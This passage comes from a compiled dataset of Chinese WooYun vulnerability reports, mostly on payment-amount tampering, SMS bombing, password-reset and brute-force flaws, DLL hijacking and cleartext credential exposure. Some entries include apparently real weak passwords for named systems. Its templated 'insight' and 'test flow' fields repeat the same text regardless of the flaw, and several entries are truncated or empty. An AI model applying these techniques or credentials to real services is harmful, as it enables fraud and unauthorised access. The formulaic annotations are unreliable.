1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 建行的网银设计思想挺不错的，但是细节上还有不足，导致了安全风险。详见证明。

**POC**: 建行网页版网银和其他银行不同，不依赖对键盘输入的保护，而是引导用户使用软键盘，试图从根本上解决键盘记录的威胁，但是依旧保留了切换至键盘输入的选项，并且没有对键盘记录器做任何对抗，导致轻易截取账号密码。软键盘方面，虽然建行对客户做了引导，但是自身软键盘保护有所不足，可以通过全屏覆盖99%透明窗口，截取鼠标消息并截图的方式截取用户密码。为了明显，demo的窗口透明度为50%：

**绕过**: 直接利用

**修复**: 既然已经加载了控件，顺便对抗一下键盘记录呗软键盘可以检测鼠标，将鼠标停留/点击的键隐藏
---

---
### [wooyun-2015-0129137] 途牛旅游网某业务逻辑漏洞
**厂商**: 途牛旅游网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 现在的互联网公司，不玩金融都不好意思说是玩互联网的；就连咱大土牛也开始玩起了金融；问题1. 在购买礼品卡时，价格通过参数提交，可以随意更改价格；如下https://example.com/[已脱敏]

**POC**: 如上以证明！

**绕过**: 直接利用

**修复**: 你懂的，在服务器端加校验吧！
---

---
### [wooyun-2012-09681] 铁血社区支付漏洞
**厂商**: 北京铁血科技 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 随便购买,:https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] 随便购买,:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 服务端验证
---

---
### [wooyun-2015-092773] 某生鲜电商逻辑漏洞
**厂商**: fruitday.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1 登陆扫号，无验证码

**POC**: 2 遍历删除收货地址https://example.com/[已脱敏]"error":0,"msg":"\u5220\u9664\u6210\u529f"}已删除

**绕过**: 直接利用

**修复**: 1 登陆账号密码错误5次增加验证码2 删除收货地址权限校验
---

---
### [wooyun-2013-041321] 某电商平台某活动逻辑缺陷导致可刷京豆
**厂商**: 某电商平台商城 | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 本来我以为你们后台会做验证的，不过晚上发现白天顺手测的到了9毛钱，就知道后台没有限制了，后台还是做个记录，当前用户今天一共幸运地抓到了上限（比如2元），然后凡是达到上限的，直接返回抽取不获奖就OK了
---

---
### [wooyun-2012-015581] 喜闻乐见的1分钱车票+顺手发现的银联和某银行支付漏洞
**厂商**: 南通汽运集团 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 南通汽运集团。我都没听过这名。注册选车次不表。注册时喜闻乐见的没有验证码。习惯了就好了。猜到怎么办了吧？这么伟大的事业，哪能烦劳burp，还是Developer Tool解决吧。。。这里改起来有点讲究，不要过头，否则银行应该是过不去的。但是。。。现在说一下银行的好事~~我们把这个金额改过头好了。现在票价是0元哈 亲~~支付去这是啥？！这又是啥？！如果金额为负数——会被银联在线拦下来。看好，银联哈！不是网站自己哈！没卡，测试无法进行，结束。订票有这么2句话：1）	只能购买当前时间2.5小时之后的车票，请考虑留足充足的行程时间，以免造成损失。2）	请在订票成功10分钟内完成付款，逾期请勿付款，付款无效。估计不会有人工审核了。特别是春运啊，什么的。

**POC**: 上面写得够多了。。。没有卡，不继续玩了。。。人在国外不方便啊。。。

**绕过**: 直接利用

**修复**: 我不是黑客。真的不是什么黑客。不懂技术。不会编程。顺手看了一下以前公布的漏洞，照猫画虎。吐槽无力。修复？翻翻前面大大的好帖子，他们写的都比我强万倍。
---

---
### [wooyun-2014-088533] 某浏览器存在Reflected File Download Attack较为鸡肋
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于某浏览器不是嵌入chrome的内核所以我们这里就用这个https://example.com/[已脱敏]

**POC**: 这样这个漏洞形成的原因就很简明了，要符合几个条件：1.在返回中能看到我们的输入并且content-type的类型不是普通类型，json或者jsonp等等。。。2.url没有过滤或转义‘/’‘;’3.是下载类型。使用不完整的Content-Disposition:attachment或者是不符合http协议的content-type。原理上基本就这样了，至于利用上这的确是有一定的鸡肋！

**绕过**: 直接利用

**修复**: PPT里面还有关于如何修复，这里我就不说了，感兴趣的童鞋可以去看看，附上PPT下载地址：https://example.com/[已脱敏]
---

---
### [wooyun-2013-047095] 妙思文献管理系统客户端设计缺陷可获数据库明文密码
**厂商**: 大连网信软件有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端连接远程数据库时，可用Wireshark软件检测封包，可找到数据库明文密码数据库存的用户密码和管理员密码全是明文EMPLOYEE，DZXXB，WWWGL，TB_USER这几个表涉及到用户隐私可造成读者私密信息泄露图书馆管理员账号密码信息泄露ltxxb表是借阅记录表图书馆借阅记录删除后可不归还图书

**POC**: password为数据库密码

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2015-0157530] 嘉华某系统设计逻辑缺陷导致内部资料泄露
**厂商**: 中国建材股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 嘉华协同办公系统，性能管理后台弱口令WLCCYBD@SEEYON可访问日志，读取session进行登录大量公司内部文件泄露，公司人员通讯录、个人资料、科研项目细节、公司物资经费报表等等

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级OA系统
---

---
### [wooyun-2015-0158081] 人民教育出版社某系统设计逻辑缺陷导致敏感信息泄露
**厂商**: 人民教育出版社 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/mailindex.nsfliyang 123456

**POC**: 同上

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2012-012225] 好孩子某站点存在支付漏洞
**厂商**: 好孩子育儿网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.存在支付漏洞的是下面这个站点：好孩子集团网上旗舰店https://example.com/[已脱敏]

**POC**: 6.再买两件衣服吧，一共只需要9元：7.点击结算，查看订单信息如下，嗯，加上18元的快递费，仍然只需要付27元哦！8.选择网上银行支付，支付的金额仍是27元哪！测试到这里就结束了，话说有礼物么？

**绕过**: 直接利用

**修复**: 1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传输的过程中进行校验，
---

---
### [wooyun-2014-067814] mcafee麦咖啡可通过暴力破解到企业授权号获取到所有企业用户的许可密钥
**厂商**: Mcafee（上海）软件有限公司 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录界面，使用任意符合规则的授权号2003199-NAI登录，提示相应错误。利用burp suite进行暴力破解，这里我选择授权号的范围为4000000-NAI到8009999-NAI，经过分析，可以获取到批量的正式授权号，然后就提交下载正版的企业软件吧

**POC**: 就上这么多了，很明显的问题，伤害了很多企业用户的利益，我就自己多下载点安全软件用了，mcafee的安全工具做的还是非常好的

**绕过**: 直接利用

**修复**: 加强认证机制，完善设计缺陷
---

---
### [wooyun-2013-016872] 红孩子网站部分功能设计缺陷，影响很严重
**厂商**: 北京红孩子互联科技有限公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1 邮箱绑定漏洞，可以任意轰炸任何邮箱。用某邮箱服务测试了下，虽然某互联网公司对某邮箱服务内容的显示有所优化，但是某互联网公司客户端会不断的弹出收到新邮件的消息，想当的蛋疼。（点击图片可以看大图）2 手机绑定处的验证漏洞，可以给任意手机号进行轰炸，虽然界面上有限制最少3分钟发一次（貌似是因为以前乌云上有人发过吧），但是还是可以通过charles等工具进行后台发送。所以说这样的限制是毫无意义的。。。既然可以短信轰炸了，那么问题就严重了，想轰炸谁就轰炸谁。或者轰炸自己，然后去找移动公司索赔。。。只有想不到，没有做不到。（点击图片可以看大图）

**POC**: 看上面，很详细了。

**绕过**: 直接利用

**修复**: 这两个问题的根本还是在，限制发送邮件（短信）的时间间隔上，一定要从根本进行控制，不要只搞那些表面上的。。。
---

---
### [wooyun-2013-025693] Windows特殊文件名漏洞
**厂商**: 微软 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件夹名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun设备名漏洞c:\test\wooyun>md \\.\c:\test\wooyun\com1.wooyun

**POC**: 创建的目录，系统不允许删除。而在WIndows2003 和之前的版本。连文件夹里的内容也无法看到。通过网站访问时：https://example.com/[已脱敏] 却可以正常访问。

**绕过**: 直接利用

**修复**: 对于 设备名目录文件，用UNC路径操作rd /s \\.\c:\test\wooyun\com1.wooyun对于 文件夹名漏洞 使用文件全名删除即可rd /s aa..\
---

---
### [wooyun-2013-022046] 中国院线通一分钱看电影漏洞
**厂商**: 电信 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 院线通支付漏洞：先选座位点网上银行看一下正常流程190RMB啊orz...后退再次提交抓包改金额提交哈哈哈有戏了

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0143700] 某家电厂商营销系统存xml注入（进一步可获取客户、员工、订单各种数据）
**厂商**: midea.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 认证接口

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先某搜索引擎到某家电厂商的ＩＭＳ然后各种登录尝试，在使用某家电厂商员工登录的时候，抓包发现点异常很明显，应该有注入丢到slqmap(以前还手工测试，有了工具，现在都懒了)看库表数据因为也不清楚业务逻辑，3000多张表，里面很多用户表，数据量太大，也不知道哪个表是什么功能，截其中一个表的count数据说明一下吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020995] 某互联网公司好友聊天发送文件给对方直接冻结对方某互联网公司号码
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发送不良的文件给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包，然后举报好友，官方会把好友的某互联网公司冻结掉我的博客https://example.com/[已脱敏]

**POC**: 然后发送给某互联网公司好友，然后点击取消（以上重复多次）系统自认为是对方发送的文件包然后点击举报如图差不多半小时对方某互联网公司号码就被冻结如图差不多15分钟到30分钟就搞定了

**绕过**: 直接利用

**修复**: 某互联网公司懂的
---

---
### [wooyun-2015-0122314] 良仓商店支付漏洞
**厂商**: iliangcang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 购物车的商品数量可以修改成负数，so，凑一车商品加加减减，走之修改数量时改成负数刷新页面点击支付跳转某电商平台

**POC**: 如上

**绕过**: 直接利用

**修复**: 付不起，付了也不送、还是算了
---

---
### [wooyun-2013-042349] 安卓某社交平台某社交平台客户端内某电商平台支付方式隐私泄漏(可被中间人）
**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安卓某社交平台某社交平台手机客户端内，可以选择购买会员，选择支付方式的时候选择某电商平台支付就会跳转到某电商平台的支付页面，在支付页面需要输入某电商平台帐号和支付密码，注意是支付密码，但是某电商平台页面在传输帐号和支付密码时用的是http协议明文传输。简单的中间人攻击就可以看到用户输入的某电商平台帐号和密码。

**POC**: 可以看到，是从某社交平台某社交平台支付会员页面选择某电商平台支付进入某电商平台页面的。跳转到某电商平台页面后，输入某电商平台的帐号和支付密码。这里输入的帐号和密码很容易被攻击者获取。下图是进行中间人攻击拦截到的一些流量。该图显示此时是在某电商平台的页面上alipay该图显示某电商平台页面在传输帐号和支付密码时用的是http协议明文传输。右侧红框内分别是某电商平台的帐号和密码，均为明文。简单的中间人攻击就可以看到这样的信息，泄漏隐私，非常危险。

**绕过**: 直接利用

**修复**: 在支付页面传输信息时采用SSL协议加密传输，而不是用http协议直接传输。或者调用手机安装的某支付钱包客户端进行支付。
---

---
### [wooyun-2013-035458] PPLive播放器DLL劫持漏洞（不限路径）
**厂商**: PPTV(PPlive) | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: PPLive（版本3,1,8,6067），安装程序为官网pptvsetup_3.3.8.0029.exe，windows xp sp3环境，PPLive运行时会试图加载多个不带路径的DLL文件，如果在音视频文件目录下放置一个恶意的同名DLL文件，当用户双击打开该音视频文件时(实验时为.mp4文件)，恶意DLL即被加载触发，危害性不用说了吧。DLL列表如下：nvcuvid.dlld3dcompiler_43.dlld3dx9_43.dll

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 带全路径加载。
---

---
### [wooyun-2015-0155185] 奥鹏严重逻辑漏洞这导致任意注册手机用户外加任意密码修改
**厂商**: open.com.cn | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先用一个手机号注册：然后抓包可以看到手机号：然后我们修改成任意一个手机号，这里我改成了我预先找好的一个手机号：然后一直forward看效果如何：直接给绑定了：OK任意注册到此为止，接下来看任意帐号密码重置点击忘记密码绑定手机找回用刚才注册的手机号由于这个当时验证的时候忘了截图了就把页面截下来意思一下：然后点击下一步抓包：手机号修改成我们要改密码的手机号：继续forward来到密码修改界面：修改密码尝试去登录：OK密码重置成功！！！！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我更专业！！
---

---
### [wooyun-2012-07293] 某电商平台网某处存在严重支付漏洞
**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在某电商IM工具2012中，使用短信旺旺中心对短信条数进行充值，在该过程中，未使用SSL安全连接，同时存在支付漏洞。选择充值的金额后，下一步，使用FID截取数据包，GBK编码，修改POST数据中的数据，seriesPrice为支付的金额，seriesNum为充值的条数，这两个地方理论上都可以进行修改，这里以修改seriesPrice为例。

**POC**: 充值前截图选择充值的套餐修改FID截取数据包，并修改seriesPrice参数,RUN以下为过程，不必多说

**绕过**: 编码绕过

**修复**: 使用SSL对支付过程进行加密只POST购买的条数，在服务器端处理所需要支付的金额，不直接POST金额和条数
---

---
### [wooyun-2012-010259] 某市水表监控系统侧漏
**厂商**: 宜春市供水系统 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某市供水系统弱口令，以及主站注入还主动保存账号。mssql信息泄露，还是弱口令

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 屏蔽注入，修复弱口令，不保存账号，mssql弱口令
---

---
### [wooyun-2015-0150832] 多个银行Android客户端信任任意服务端证书漏洞打包
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客户端程序服务该谷歌默认证书检查机制，而客户端程序程序自身未对所连服务端证书做验证，导致可被中间人劫持，解密客户端与银行服务端通信数据。稠州银行Android客户端珠海华润银行Android客户端华润直销银行Android客户端晋城银行Android客户端

**POC**: 以稠州银行Android客户端为例1.基本信息apk  : com.hundsun.mobile.hsbrowser, 6, 4.0, 稠州银行apkmd5: bbbff29b72ee5ba957cdec298eed1647证书 :certmd5: 4d6ce9376830b1a909220763b1949037issuer: C=czcb, ST=czcb, L=czcb, O=czcb, OU=czcb, CN=czcbsubject: C=czcb, ST=czcb, L=czcb, O=czcb, OU=czcb, CN=czcb下载地址：http://**.**.**.**/sjyh

**绕过**: 直接利用

**修复**: 客户端
---

---
### [wooyun-2013-046969] DLL注入可绕过金山毒霸任意执行代码
**厂商**: 金山毒霸 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大体流程是这样的:1.注册com对象到word2.调用CreateDispatch(_T("Word.Application"))触发dump动作（因为只有这样才能做到悄无声息）,生成注册表services里minipoc3.驱动里修改了IE主页，当然,到驱动的就全过了4.同时根据前段时间提的信息不对称检测漏洞，驱动启动的时候会自删除绕过扫描检测。而我又懒得再回写了，因此只在重启第一次的时候有效.

**POC**: 测试前最好先检查默认IE主页演示POC程序地址：https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 为啥别的厂商老落后360呢？你们不是很鄙视人家吗？到底鄙视的是啥？
---

---
### [wooyun-2011-02113] Dns-suffix may lead to cross-domain and other security problems
**厂商**: OS | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: We all know that dhcpd can set the dns suffix for its clients. For example , If we set the dns suffix as "test.com". While doing the domain name resolution  such as www.xxx.com , all the client using this dhcp server will try the following order.1. System tries  to look up www.xxx.com  if the dns find a IP addr , the client will go on use this ip.2. Otherwise , the system will automatically add th

**POC**: Scenario ：1.Company A.COM  provide secondary domain registation for their customers ( eg. free blog system) .People can register any username they want, from example  test . Then his space will be test.A.com.  This works fine.2.Company's internal network using a dhcp server which automatically adds 

**绕过**: 直接利用

**修复**: fix lib
---

---
### [wooyun-2014-065534] Ucserver三个小问题
**厂商**: Discuz! | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，暴力破解。ucserver的默认管理员登录需要输入验证码，并且还有登录次数的限制，但是在：/control/app.php 内是没有限制登录的次数的function onadd() {$ucfounderpw = getgpc('ucfounderpw', 'P');$apptype = getgpc('apptype', 'P');$appname = getgpc('appname', 'P');$appurl = getgpc('appurl', 'P');$appip = getgpc('appip', 'P');$viewprourl = getgpc('viewprourl', 'P');$appcharset = getgpc('appcharset', 'P');$appdbcharset = getgpc('appdbcharset', 'P');$apptagtem

**POC**: 整个其实危害还是挺大的：如果你能暴力出来一个ucserver的管理员密码，你就可以把ucserver和uclient黑了。如果你能黑掉你列出来的任何一个uclient的应用，你就可以拿应用的uckey对ucserver注射。

**绕过**: 直接利用

**修复**: uc的onls用不上的话可以去掉或者做限制。onadd也可以做个次数限制。SQL注射直接在foreach里进行intval就好了。
---

---
### [wooyun-2015-0118960] 买嘎嘎设计缺陷可无限制刷取嘎币
**厂商**: 买嘎嘎 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞对应的业务逻辑：  “我的” - “嘎嘎会员” - “会员任务” - “3.软件分享”任务列表获取接口：请求：POST //gagaapi/task.php HTTP/1.1Content-Length: 75Content-Type: application/x-www-form-urlencodedHost: www.buygaga.comConnection: Keep-AliveUser-Agent: Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; MI NOTE LTE Build/KTU84P) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1Cookie: PHPSESSID=94ndklvi24rc9jpj8gpi1d4j72Cookie2

**POC**: 我现在有41个嘎币：我接下来访问10次任务完成提交访问10次后的结果全部正确:我现在就从41个嘎币变成51个嘎币了。

**绕过**: 直接利用

**修复**: 服务端 加上任务提交 每天一次的限制即可。
---

---
### [wooyun-2014-062532] 悠哉旅行网任意金额支付漏洞
**厂商**: 悠哉旅游网 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 添加各类保险之类的东西时，未做数值认证。可修改为负！修改为正你以为就可以了么。。有个什么在线预定可减免10元，修改数值为100，一样可以减少金额！知道你们要说后台会有二次核对啥的。我利用在线预定减免10元的，减免个几十块总行！

**POC**: 添加各类保险之类的东西时，未做数值认证。可修改为负！修改为正你以为就可以了么。。有个什么在线预定可减免10元，修改数值为100，一样可以减少金额！知道你们要说后台会有二次核对啥的。我利用在线预定减免10元的，减免个几十块总行！

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-03839] 手机某互联网公司隐身可查看
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 查看好友资料时，好友虽然已经隐身，但是在查看标签和印象时，出现一个"对方正在使用的版本不支持此功能”的提示，说明这个好友正在使用手机登录某互联网公司，并且在线。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0135919] 爱丽网某处存在设计逻辑缺陷错误
**厂商**: aili.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 与利益挂钩的东西都非同小可。老板，来一波礼物可好~

**POC**: 首先，请注册一个账号然后点击右上角ID  进入个人资料页面。请注意，这里我的积分现在是11分！而这个逻辑漏洞就在其中的积分系统中。如图所示，积分奖励机制是这样的。其中 日志系统做了限制。每天最多100次，一次4分。这样一天能刷400分所以，点击  写日志。随意打点什么字！打开Burpsuite抓包这里我输入的标题是  2   内容是  3所以抓包得到的title=2就是标题。我们将其发送到Intruder，把标题设为变量。1-100因为最多100次，这样就只用了几秒就刷完了这400分。如图回到个人首页，看下！411分~--------------------------------------

**绕过**: 直接利用

**修复**: 你比我聪明比我强！
---

---
### [wooyun-2016-0166293] 上港集团某系统设计逻辑缺陷导致内部信息泄露
**厂商**: 上港集团物流有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-054285] 263邮箱以及云通信软件支付漏洞
**厂商**: 263通信 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于支付过程中，在支付前没有对金钱等信息进行签名操作，导致支付过程中支付敏感信息被篡改，实现攻击成功。这个漏洞涉及他的邮箱以及android客户端的支付过程。android客户端可以打国际长途。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 在支付前对所有的敏感信息进行签名，并在支付成功后对所有的敏感信息以及签名进行验证
---

---
### [wooyun-2013-037499] 某互联网公司视频客户端多处DLL劫持（系统目录DLL）
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时某互联网公司视频客户端的安装路径为：C:\Program Files\Tencent\某互联网公司Live\打开某互联网公司Live.exe时会加载四处不存在的DLL文件.打开某互联网公司视频客户端时加载如下不存在的DLLC:\WINDOWS\system32\kernelbase.dllC:\Program Files\Tencent\某互联网公司Live\idframe.dll播放时加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Live\quserex.dll退出客户端时加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Live\diagnosis.dll以上任一DLL文件与某互联网公司Live.exe放在对应的目录，这样就可以在运行某互联网公司Live.exe的时候会同时加载对应的DLL，这个DLL可以为自制的任意内容的dll。此方法可用于劫持运行某些程序（木马病毒）。（我这里

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2016-0168711]  满橙积分商城设计逻辑缺陷漏洞一枚
**厂商**: 满橙 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**可以免费兑换礼品咯。可以负数存在，逻辑问题。控制不严。

**POC**: (见原文)

